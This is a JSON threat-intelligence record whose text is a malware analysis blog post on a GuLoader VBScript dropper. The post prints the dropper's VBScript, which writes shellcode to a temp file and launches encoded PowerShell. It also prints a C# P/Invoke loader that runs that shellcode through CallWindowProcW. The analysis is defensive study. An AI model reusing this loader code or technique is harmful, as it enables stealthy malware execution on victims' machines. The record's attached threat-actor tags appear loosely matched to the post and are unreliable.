@@ -1,0 +1,183 @@
+{
+    "id": "d673dc3f-cc0c-4b84-bc58-5b96e85408ef",
+    "created_at": "2023-01-12T15:07:56.221489Z",
+    "updated_at": "2025-03-27T02:16:26.118996Z",
+    "deleted_at": null,
+    "sha1_hash": "e576620f9a14dbf13068932ef1d30e2d9b0ab63b",
+    "title": "2022-01-27 - GuLoader Executing Shellcode Using Callback Functions",
+    "authors": "",
+    "file_creation_date": "2022-05-28T05:07:02Z",
+    "file_modification_date": "2022-05-28T05:07:02Z",
+    "file_size": 191765,
+    "plain_text": "# GuLoader Executing Shellcode Using Callback Functions\n\n**[forensicitguy.github.io/guloader-executing-shellcode-callbacks/](https://forensicitguy.github.io/guloader-executing-shellcode-callbacks/)**\n\nJanuary 27, 2022\n\n### By Tony Lambert Posted 2022-01-27 Updated 2022-03-28 10 min read\n\n I personally despise trying to analyze shellcode, but shellcode is becoming more common in malware of all types. From Metasploit and Cobalt Strike to GuLoader, loads of malicious tools include shellcode as injectable payloads to make detection harder. In today’s post I want to look at one of the most recent iterations of GuLoader and how it deploys its shellcode. If you want to play along at home, the sample I’m analyzing is in MalwareBazaar here: https://bazaar.abuse.ch/sample/dcc73a1351b6b79d48f7b42a96edfb142ffe46f896e1ab9f41 2a615b1edd7c9b/\n\n## Triaging the First Stage\n\n### For the first stage, MalwareBazaar says its a VBScript file, so we’ve already got a decent hypothesis on the file type. We can go ahead and confirm with file and xxd . Sure enough, it looks like we’re dealing with a text file, and the first few bytes of the text file looks like they might be a VBScript comment prepended with a ' character.\n\n\n-----\n\n```\n  remnux@remnux:~/cases/guloader$ file remittence.vbs \n  remittence.vbs: ASCII text, with CRLF line terminators\n  remnux@remnux:~/cases/guloader$ xxd remittence.vbs | head\n  00000000: 2767 656e 6b61 6c64 656c 7320 556e 6d65 'genkaldels\n  Unme\n  00000010: 7769 6e67 6239 204e 6575 726f 6e64 6536 wingb9\n  Neuronde6\n  00000020: 204b 726f 7033 2042 6172 6265 7269 206d  Krop3\n  Barberi m\n  00000030: 6973 7265 2066 7269 6d20 554e 4143 2048 isre frim\n  UNAC H\n  00000040: 594c 4550 4920 4d41 4c54 4e49 4e20 4752 YLEPI\n  MALTNIN GR\n  00000050: 4144 2048 4f4c 4f53 5920 4272 7569 6e73 AD HOLOSY\n  Bruins\n  00000060: 6875 2064 656d 756c 2049 4e47 4956 4545 hu demul\n  INGIVEE\n  00000070: 5520 504f 5354 4e41 5445 4e20 5649 4e44 U POSTNATEN\n  VIND\n  00000080: 454e 5355 4e44 204b 7572 6461 6974 3320 ENSUND\n  Kurdait3 \n  00000090: 5448 4f4d 534f 4e41 4e54 2053 7562 7275 THOMSONANT\n  Subru\n\n### Looking at the details from exiftool, the size of the file stands out. Weighing in at 80 KiB, the script likely contains some binary/EXE content embedded inside. 673 lines of code, it’s a pretty decently-sized script. So let’s dive in!\n\n```\n\n-----\n\n```\n  remnux@remnux:~/cases/guloader$ exiftool\n  remittence.vbs \n  ExifTool Version Number     : 12.30\n  File Name            : remittence.vbs\n  Directory            : .\n  File Size            : 80 KiB\n  File Modification Date/Time   : 2022:01:25 01:07:38  05:00\n  File Access Date/Time      : 2022:01:24 21:43:55  05:00\n  File Inode Change Date/Time   : 2022:01:24 20:11:16  05:00\n  File Permissions        : -rw-r--r-  File Type            : TXT\n  File Type Extension       : txt\n  MIME Type            : text/plain\n  MIME Encoding          : us-ascii\n  Newlines            : Windows CRLF\n  Line Count           : 673\n  Word Count           : 3409\n\n## Examining the VBScript Code\n\n### Immediately on the first few lines of the script we can see several lines of VBScript comments. Usually comments are for code documentation (heh, right?) but in this case the adversary decided to put in some garbage code. This sort of thing is usually intended to stump static detection rules, lower AV detection rates, and slow down malware analysis. After a quick glance at the comment lines, there’s nothing that really tells me that we need to keep them, so we can just ignore or delete them.\n\n```\n\n-----\n\n```\n  'genkaldels Unmewingb9 Neuronde6 Krop3 Barberi misre frim UNAC HYLEPI MALTNIN\n  GRAD HOLOSY Bruinshu demul INGIVEEU POSTNATEN VINDENSUND Kurdait3 THOMSONANT\n  Subrules BRUGSGA Usselhed Fakt Waughtsfo Udmugning NONPRO NONDEFER MUDDERGRFT\n  bondsla Bros europapa \n  'Bebrejd Blevins DRABS EDDA Uberrt2 TILLIGGEND Nedisni1 Unrefulg Tsum AGRA\n  Renderne \n  'Darvon FORLDREKN Vasalsta faaspointe Numselea9 Speedw TVANGL Ejert stymieds\n  Writ6 liquefy Censedspe4 MEANDR BOWLINGEN bassetters yokoonop visuals\n  Platingbyg5 SKARNB Bygningsfe Pulli Farve baasetm klejne \n  'INDTRDELSE HJEMM Fortjenst Nsvi sirdar FORMAL Progra2 airworth Axometrybl6\n  Stan6 OBLIGATI Ineffi Unsa Conven Bisulfate AKUPUNKT preadjust SIDE Pels2\n  antilethar manch ALDERLIN Nimmedvor \n\n### Next up in the code we have a simple sleep timer right after some variables get defined. The script sleeps for 2000 milliseconds before moving on to the next stage.\n  Dim sired, objExec,\n  strLine\n  Dim MyFile,teststr\n  F = timer\n  Wscript.Sleep 2000\n  G = timer \n  If G > F then\n\n Down in the next section the adversary decides to set the sired and CCA variables multiple times in a row. No idea why they do it like this, maybe they also hit the save button in MS Office multiple times for safety. The sired variable contains a Wscript shell object and CCA contains a file system object for file writing.\n\n```\n\n-----\n\n```\n  set sired = CreateObject(\"Wscript.Shell\")\n  Set CCA =\n  CreateObject(\"S\"+\"cripting.FileSystemObject\")\n  set sired = CreateObject(\"Wscript.Shell\")\n  Set CCA =\n  CreateObject(\"S\"+\"cripting.FileSystemObject\")\n  set sired = CreateObject(\"Wscript.Shell\")\n  Set CCA =\n  CreateObject(\"S\"+\"cripting.FileSystemObject\")\n\n### And now we get into the good meat of the script. The Fotografe6 variable is built over multiple lines and contains what loks like a hex string. I don’t see a traditional MZ header represented as 4D5A in hex, but it could be further obfuscated somehow. We’ll just have to watch and see how the script uses it.\n  Fotografe6 = Fotografe6 & \"81ED000300006 ...\n  EF9F10408E\"\n  Fotografe6 = Fotografe6 & \"4166620BE8491 ...\n  62D3219DF4\"\n\n The clabbering variable, just like the previous one, is built over multiple lines. In this case it appears to be base64 code because once we feed some of the chunks into CyberChef with the “From Base64” it decodes into valid text.\n  clabbering = clabbering & \"IwBBAEkAUgBFA ...\n  AGEAbgB0AG\"\n  clabbering = clabbering & \"kAdAB5AHIAbwAg ...\n  bABrAG8AI\"\n  clabbering = clabbering & \"ABuAG8AbgBtAGE ...\n  AbwBpAHMA\"\n  clabbering = clabbering & \"IABVAG4AdgBlAG ...\n  MASABVAFQ\"\n\n Now that we have an idea of the materials being manipulated in the script, let’s see how the script uses them. The next chunk of code looks like it’s building a PowerShell command. At this point I’m thinking the base64 chunk of text in clabbering above will likely be fed into\n\n```\n\n-----\n\n### PowerShell for execution. Fotografe6 looks like it gets fed into a baggrun() and\n```\nlugsai() function. Since shellPath contains a file path and the string ISO-8859-1\n\n refers to encoding, my hypothesis is that lugsai() writes the contents of Fotografe6 to disk. Let’s go confirm that.\n  TMP1 = \"%\"+\"TEMP%\"\n  MyFile = sired.ExpandEnvironmentStrings(\"%windir%\") &\n  \"\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\"\n  Fotografe6 = baggrun(Fotografe6)\n  shellPath = sired.ExpandEnvironmentStrings(TMP1) & \"\\Champag6.dat\"\n  lugsai shellPath,Fotografe6,\"ISO-8859-1\"\n\n The lugsai() function looks like it works with an ADODB.Stream object, picks a character set, opens a file, and writes text to disk. So far it looks like our hypothesis was correct.\n  Function lugsai(NONN, UNDEGRAD,\n  Lathesme1)\n   Dim BinaryStream\n   ADO = \"ADODB.Stream\"\n   Set BinaryStream =\n  CreateObject(ADO)\n   BinaryStream.Type = 2\n   BinaryStream.CharSet = Lathesme1\n   BinaryStream.Open\n   BinaryStream.WriteText UNDEGRAD\n   BinaryStream.SaveToFile NONN, 2\n  End Function\n\n```\n\n-----\n\n### The baggrun() function looks like it works with the hex string in Fotografe6 . The function walks through the hex string and checks for “ZZZ” values. If it doesn’t find them it just outputs the hex string.\n```\n  Function baggrun(h)\n       For i = 1 To len(h) step 2\n       if ChrW(\"&H\" & mid(h,i,2)) = \"ZZZ\" then\n  Wscript.Sleep(1)\n       baggrun = baggrun + ChrW(\"&H\" & mid(h,i,2))\n       Next\n  End Function\n\n And now the script starts making some movement outside of itself. The -EncodedCommand string here indicates we’re likely going to see a PowerShell command with a base64 chunk of code. Sure enough, the base64 code in clabbering eventually gets used for the PowerShell command. So let’s\n  Set obj1 = CreateObject(\"Shell.Application\")\n  max1=clabbering\n  RAVNEAGT = \" -EncodedCommand \" & chr(34) & max1 &\n  chr(34)\n  If CCA.FileExists(MyFile) = True then \n  obj1.ShellExecute MyFile, RAVNEAGT,\"\",\"\",0\n  else \n  obj1.ShellExecute \"powershell.exe\", RAVNEAGT\n ,\"\",\"\",0\n  end if \n\n## PowerShell Executing Shellcode with .NET\n\n```\n\n-----\n\n### After decoding the base64 in clabbering with CyberChef we can see some PowerShell code that gets executed. Just like the VBScript, the first line or two just contains a useless comment. Looking through the rest of the code there are also a few comments mingled among the useful stuff. For a bit more brevity I’ve gone ahead and removed comments from the code I show here. To slow down analysis some more, the adversary also threw in a bunch of Test-Path commands. None of them seemed to serve any function, so I removed them from the code here.\n\n The first big chunk of PowerShell is an Add-Type cmdlet followed by some C# code.\n```\nAdd-Type allows you to import a .NET class DLL into memory to work with in PowerShell.\n\n When combined with the -TypeDefinition, you can provide some raw C# code that gets compiled into bytecode at runtime and loaded into PowerShell. In this case, the adversary defines a .NET class named Ofayve1 that contains Platform Invoke (P/Invoke) code that allows the adversary to call native Win32 functions from .NET code.\n  Add-Type -TypeDefinition @\"\n  using System;\n  using System.Runtime.InteropServices;\n  public static class Ofayve1\n  {\n  [DllImport(\"ntdll.dll\")]public static extern int NtAllocateVirtualMemory(int\n  Ofayve6,ref Int32 Swat9,int Rasko8,ref Int32 Ofayve,int Metzerespe9,int\n  Ofayve7);\n  [DllImport(\"kernel32.dll\")]public static extern IntPtr CreateFileA(string\n  BUTTERMA,uint Contra6,int undvrpieti,int Ofayve0,int Foldysy7,int Oboer8,int\n  BLUFF);\n  [DllImport(\"kernel32.dll\")]public static extern int ReadFile(int Rasko80,uint\n  Rasko81,IntPtr Rasko82,ref Int32 Rasko83,int Rasko84);\n  [DllImport(\"user32.dll\")]public static extern IntPtr CallWindowProcW(IntPtr\n  Rasko85,int Rasko86,int Rasko87,int Rasko88,int Rasko89);\n  }\n  \"@\n\n From here in, the adversary references that class/type to call Windows API functions. The first three are pretty self-explanatory and I’ll put links to their documentation here:\n\n NtAllocateVirtualMemory CreateFileA ReadFile\n\n```\n\n-----\n\n### When combined together, these functions read the contents of Champag6.dat and mapped them into memory at $Ofayve3 . These contents included the hex string seen earlier, and my working hypothesis is that the file is some form of shellcode.\n```\n  $Ofayve3=0;\n  $Ofayve9=1048576;\n  $Ofayve8=[Ofayve1]::NtAllocateVirtualMemory(-1,[ref]$Ofayve3,0,\n  [ref]$Ofayve9,12288,64)\n  $Ofayve2=\"$env:temp\" + \"\\Champag6.dat\"\n  $Ofayve4=[Ofayve1]::CreateFileA($Ofayve2,2147483648,1,0,3,128,0)\n  $Ofayve5=0;\n  [Ofayve1]::ReadFile($Ofayve4,$Ofayve3,26042,[ref]$Ofayve5,0)\n  [Ofayve1]::CallWindowProcW($Ofayve3, 0,0,0,0)\n\n The final part of the script calls CallWindowProcW, which was unusual for me to see. I decided to get a little wild and do a Google search for “CallWindowProc shellcode” and ended up running across an interesting article on using function callbacks to run shellcode. Reading down the article, I could see some code that looks very similar to our sample:\n  CallWindowProc((WNDPROC)(char *)shellcode, (HWND)0, 0,\n  0, 0);\n\n Sure enough, the GuLoader code above seems to match that callback article.\n\n## But is it GuLoader?\n\n### Honestly this is hard for me to tell. I largely trust the GuLoader tag in MalwareBazaar but it’s always good to have extra proof. When I open up the suspected shellcode in Ghidra there is some definite XOR activity going on.\n\n```\n\n-----\n\n### And when I use this little chunk of Python code, I can reverse that XOR:\n```\n  def str_xor(data, key):\n    for i in range(len(data)):\n      data[i] ^= key[i % len(key)]\n    return data\n  key = bytearray(b'0x6a8a4f58')\n  data = bytearray(open('encoded_shellcode.bin', \n  'rb').read())\n  decoded = str_xor(data, key)\n  open(\"decoded_shellcode.bin\", \"wb\").write(decoded)\n\n Credit to https://reverseengineering.stackexchange.com/questions/11033/how-to-decrypt- data-in-binary-file-by-xor-operator-using-a-given-key-at-specific\n\n The resulting shellcode gets some hits from capa as containing anti-VM and sandbox evasion measures.\n\n```\n\n-----\n\n```\nremnux@remnux:~/cases/guloader$ capa -f sc32 dec_shellcode.bin \n+------------------------------------------------------+-----------------------------------+\n| md5          | 565eb36ab19132a4b963cc840febd24c           \n|\n| sha1          | 78dd372f6ed9962d0a0e3841675ab374235d2f94       \n|\n| sha256         |\n82ec24bbf698d635f3e7bfbda89971518f010c8efde79fcd43a2805a0945850f |\n| path          | dec_shellcode.bin                  \n|\n+------------------------------------------------------+-----------------------------------+\n+------------------------------------------------------+-----------------------------------+\n| ATT&CK Tactic     | ATT&CK Technique                   \n|\n+------------------------------------------------------+-----------------------------------+\n| DEFENSE EVASION    | Virtualization/Sandbox Evasion::System Checks\nT1497.001     |\n+------------------------------------------------------+-----------------------------------+\n+------------------------------------------------------+-----------------------------------+\n| MBC Objective        | MBC Behavior                  \n|\n+------------------------------------------------------+-----------------------------------+\n| ANTI-BEHAVIORAL ANALYSIS  | Virtual Machine Detection::Instruction Testing\n[B0009.029] |\n+------------------------------------------------------+-----------------------------------+\n+------------------------------------------------------+-----------------------------------+\n| CAPABILITY          | NAMESPACE                   \n|\n+------------------------------------------------------+-----------------------------------+\n| execute anti-VM instructions | anti-analysis/anti-vm/vm-detection      \n|\n+------------------------------------------------------+-----------------------------------+\n\n```\n\n-----\n\n### This is where I stopped my particular analysis. GuLoader is rather famous for anti-VM, anti- sandbox, anti-whatever, so I feel pretty satisfied with our progress so far. Given the shellcode capabilities and the face that GuLoader usually involves shellcode like this, I’m good with calling it GuLoader.\n\n Thanks for reading!\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-01-27 - GuLoader Executing Shellcode Using Callback Functions.pdf"
+    ],
+    "report_names": [
+        "2022-01-27 - GuLoader Executing Shellcode Using Callback Functions.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "610a7295-3139-4f34-8cec-b3da40add480",
+            "created_at": "2023-01-06T13:46:38.608142Z",
+            "updated_at": "2025-03-27T02:00:02.87217Z",
+            "deleted_at": null,
+            "main_name": "Cobalt",
+            "aliases": [
+                "Cobalt Gang",
+                "GOLD KINGSWOOD",
+                "COBALT SPIDER",
+                "G0080",
+                "Mule Libra",
+                "Cobalt Group"
+            ],
+            "source_name": "MISPGALAXY:Cobalt",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
+            "created_at": "2022-10-25T15:50:23.548494Z",
+            "updated_at": "2025-03-27T02:00:55.49688Z",
+            "deleted_at": null,
+            "main_name": "APT29",
+            "aliases": [
+                "APT29",
+                "IRON RITUAL",
+                "IRON HEMLOCK",
+                "NobleBaron",
+                "Dark Halo",
+                "NOBELIUM",
+                "UNC2452",
+                "YTTRIUM",
+                "The Dukes",
+                "Cozy Bear",
+                "CozyDuke",
+                "SolarStorm",
+                "Blue Kitsune",
+                "UNC3524",
+                "Midnight Blizzard"
+            ],
+            "source_name": "MITRE:APT29",
+            "tools": [
+                "PinchDuke",
+                "ROADTools",
+                "WellMail",
+                "CozyCar",
+                "Mimikatz",
+                "Tasklist",
+                "OnionDuke",
+                "FatDuke",
+                "POSHSPY",
+                "EnvyScout",
+                "SoreFang",
+                "GeminiDuke",
+                "GoldMax",
+                "FoggyWeb",
+                "SDelete",
+                "PolyglotDuke",
+                "AADInternals",
+                "MiniDuke",
+                "SeaDuke",
+                "Sibot",
+                "RegDuke",
+                "CloudDuke",
+                "GoldFinder",
+                "AdFind",
+                "PsExec",
+                "NativeZone",
+                "Systeminfo",
+                "ipconfig",
+                "Impacket",
+                "Cobalt Strike",
+                "PowerDuke",
+                "QUIETEXIT",
+                "HAMMERTOSS",
+                "BoomBox",
+                "CosmicDuke",
+                "WellMess",
+                "VaporRage",
+                "LiteDuke"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
+            "created_at": "2023-01-06T13:46:38.393409Z",
+            "updated_at": "2025-03-27T02:00:02.822155Z",
+            "deleted_at": null,
+            "main_name": "APT29",
+            "aliases": [
+                "The Dukes",
+                "Minidionis",
+                "Grizzly Steppe",
+                "G0016",
+                "Blue Kitsune",
+                "BlueBravo",
+                "SeaDuke",
+                "Cloaked Ursa",
+                "YTTRIUM",
+                "ATK7",
+                "Nobelium",
+                "UAC-0029",
+                "Group 100",
+                "COZY BEAR",
+                "IRON HEMLOCK",
+                "TA421",
+                "ITG11"
+            ],
+            "source_name": "MISPGALAXY:APT29",
+            "tools": [
+                "QUARTERRIG",
+                "SNOWYAMBER",
+                "HALFRIG"
+            ],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
+            "created_at": "2024-11-01T02:00:52.756877Z",
+            "updated_at": "2025-03-27T02:00:55.544216Z",
+            "deleted_at": null,
+            "main_name": "Play",
+            "aliases": null,
+            "source_name": "MITRE:Play",
+            "tools": [
+                "Nltest",
+                "AdFind",
+                "PsExec",
+                "Wevtutil",
+                "Cobalt Strike",
+                "Playcrypt",
+                "Mimikatz"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673536076,
+    "ts_updated_at": 1743041786,
+    "ts_creation_date": 1653714422,
+    "ts_modification_date": 1653714422,
+    "files": {
+        "pdf": "https://archive.orkl.eu/e576620f9a14dbf13068932ef1d30e2d9b0ab63b.pdf",
+        "text": "https://archive.orkl.eu/e576620f9a14dbf13068932ef1d30e2d9b0ab63b.txt",
+        "img": "https://archive.orkl.eu/e576620f9a14dbf13068932ef1d30e2d9b0ab63b.jpg"
+    }
+}
